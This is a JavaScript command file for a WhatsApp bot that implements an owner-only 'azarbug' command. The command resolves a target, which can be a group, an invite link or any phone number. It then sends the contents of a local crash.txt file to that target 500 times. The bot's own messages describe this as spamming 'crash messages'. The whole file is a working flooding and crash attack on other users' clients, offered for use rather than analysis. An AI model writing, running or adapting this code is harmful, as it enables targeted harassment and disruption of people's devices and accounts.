// commands/azarbug.js
// ==============================================
// ⚠️ AZAR-BUG Command (Owner Only) - SIMPLE CONFIRMATION
// ==============================================

const fs = require("fs");
const path = require("path");
const settings = require("../settings");

// Store confirmation states
const pendingConfirmations = new Map();

module.exports = async (sock, msg, from, text, args, store) => {
  try {
    // 🔒 OWNER VERIFICATION
    console.log("🔍 Checking owner access...");

    let yourJid = "";
    let yourNumber = "";

    if (from.endsWith("@g.us")) {
      yourJid = msg.key.participant || "";
    } else {
      yourJid = msg.key.remoteJid || "";
    }

    // Clean number from JID
    if (yourJid) {
      yourNumber = yourJid.split("@")[0].split(":")[0].replace(/\D/g, "");
    }

    // Get owner number from settings
    const ownerNumber = (settings.ownerNumber || "").replace(/\D/g, "");

    let isOwner = false;

    if (msg.key.fromMe) {
      isOwner = true;
    } else if (yourNumber === ownerNumber || (yourNumber && ownerNumber && yourNumber.endsWith(ownerNumber))) {
      isOwner = true;
    }

    console.log("🔐 Is owner?", isOwner);

    if (!isOwner) {
      return await sock.sendMessage(
        from,
        { text: `🚨 Non-owner attempted high-risk command: azarbug` },
        { quoted: msg }
      );
    }

    // ✅ OWNER VERIFIED
    console.log("🎉 Owner verified!");

    // 📝 DETERMINE TARGET
    let targetJid;
    let targetType = "";
    let groupSubject = "";

    // No args or "group" - spam current group
    if (!args[0] || args[0].toLowerCase() === "group") {
      if (!from.endsWith("@g.us")) {
        return await sock.sendMessage(
          from,
          { text: "❌ Use in a group or specify target.\nUsage: .azarbug group\n.azarbug 917xxxxxxx\n.azarbug https://chat.whatsapp.com/xxx" },
          { quoted: msg }
        );
      }
      targetJid = from;
      targetType = "current group";
    }
    // Group link support
    else if (args[0].includes("chat.whatsapp.com")) {
      const groupLink = args[0];
      console.log(`🔗 Processing group link: ${groupLink}`);

      // Extract group code and get JID
      try {
        const urlParts = groupLink.split("/");
        const code = urlParts[urlParts.length - 1].trim();

        if (!code) {
          return await sock.sendMessage(
            from,
            { text: "❌ Invalid group link." },
            { quoted: msg }
          );
        }

        // Get group info
        const groupInfo = await sock.groupGetInviteInfo(code);
        if (!groupInfo || !groupInfo.id) {
          return await sock.sendMessage(
            from,
            { text: "❌ Invalid group link." },
            { quoted: msg }
          );
        }

        targetJid = groupInfo.id;

        // Check if bot is in group
        try {
          const metadata = await sock.groupMetadata(targetJid);
          groupSubject = metadata.subject || "Unknown Group";
          targetType = `group: ${groupSubject}`;
        } catch (err) {
          return await sock.sendMessage(
            from,
            { text: "❌ Bot is NOT in that group. Add bot first." },
            { quoted: msg }
          );
        }
      } catch (err) {
        return await sock.sendMessage(
          from,
          { text: "❌ Error processing group link." },
          { quoted: msg }
        );
      }
    }
    // Direct group JID
    else if (args[0].includes("@g.us")) {
      targetJid = args[0];
      targetType = "specified group";

      // Verify bot is in this group
      try {
        const metadata = await sock.groupMetadata(targetJid);
        groupSubject = metadata.subject || "Unknown Group";
        targetType = `group: ${groupSubject}`;
      } catch (err) {
        return await sock.sendMessage(
          from,
          { text: `❌ Bot is NOT in that group!` },
          { quoted: msg }
        );
      }
    }
    // Phone number (private chat)
    else {
      const targetNum = args[0].replace(/\D/g, "");
      if (targetNum.length < 9) {
        return await sock.sendMessage(
          from,
          { text: "❌ Invalid number." },
          { quoted: msg }
        );
      }
      targetJid = `${targetNum}@s.whatsapp.net`;
      targetType = "private chat";
    }

    console.log("🎯 Target:", targetJid, "Type:", targetType);

    // 📥 READ CRASH FILE
    const filePath = path.join(__dirname, "../media/crash.txt");
    if (!fs.existsSync(filePath)) {
      return await sock.sendMessage(
        from,
        { text: "❌ crash.txt not found." },
        { quoted: msg }
      );
    }

    const content = fs.readFileSync(filePath, "utf-8").trim();
    if (!content) {
      return await sock.sendMessage(
        from,
        { text: "❌ crash.txt is empty." },
        { quoted: msg }
      );
    }

    const payload = "⚠️ *AzarBug* " + content;

    // 🔥 SIMPLE CONFIRMATION - RUN COMMAND TWICE
    // Create a unique key for this confirmation
    const confirmKey = `${from}-${targetJid}`;

    // Check if this is the second time (confirmation)
    if (pendingConfirmations.has(confirmKey)) {
      // Remove from pending
      pendingConfirmations.delete(confirmKey);

      // ✅ CONFIRMED - START SPAMMING
      await sock.sendMessage(
        from,
        { text: `✅ Confirmed! Starting 500-message spam to ${targetType}...` },
        { quoted: msg }
      );

      const totalMessages = 500;
      let successCount = 0;

      for (let i = 0; i < totalMessages; i++) {
        try {
          await sock.sendMessage(targetJid, { text: payload });
          successCount++;

          // Progress update
          if (i % 100 === 0 && i > 0) {
            await sock.sendMessage(
              from,
              { text: `📊 Progress: ${i}/${totalMessages}` },
              { quoted: msg }
            );
          }

          // Delay
          await new Promise(r => setTimeout(r, 200));

        } catch (err) {
          console.error(`❌ Failed at ${i + 1}:`, err.message);
          break;
        }
      }

      // Final report
      await sock.sendMessage(
        from,
        { text: `✅ Spam complete: ${successCount}/${totalMessages} sent to ${targetType}` },
        { quoted: msg }
      );

    } else {
      // First time - ask for confirmation
      pendingConfirmations.set(confirmKey, {
        timestamp: Date.now(),
        targetJid,
        targetType
      });

      // Set timeout to auto-remove (5 minutes)
      setTimeout(() => {
        if (pendingConfirmations.has(confirmKey)) {
          pendingConfirmations.delete(confirmKey);
        }
      }, 5 * 60 * 1000);

      await sock.sendMessage(
        from,
        { 
          text: `⚠️ *CONFIRM AZAR-BUG*\n\nTarget: ${targetType}\nMessages: 500\n\nSend the command *again* to confirm:\n\`.azarbug ${args[0] || 'group'}\`\n\n⚠️ This will spam 500 crash messages!` 
        },
        { quoted: msg }
      );
    }

  } catch (error) {
    console.error("❌ .azarbug error:", error);
    try {
      await sock.sendMessage(
        from, 
        { text: `❌ Error: ${error.message}` }, 
        { quoted: msg }
      );
    } catch {}
  }
};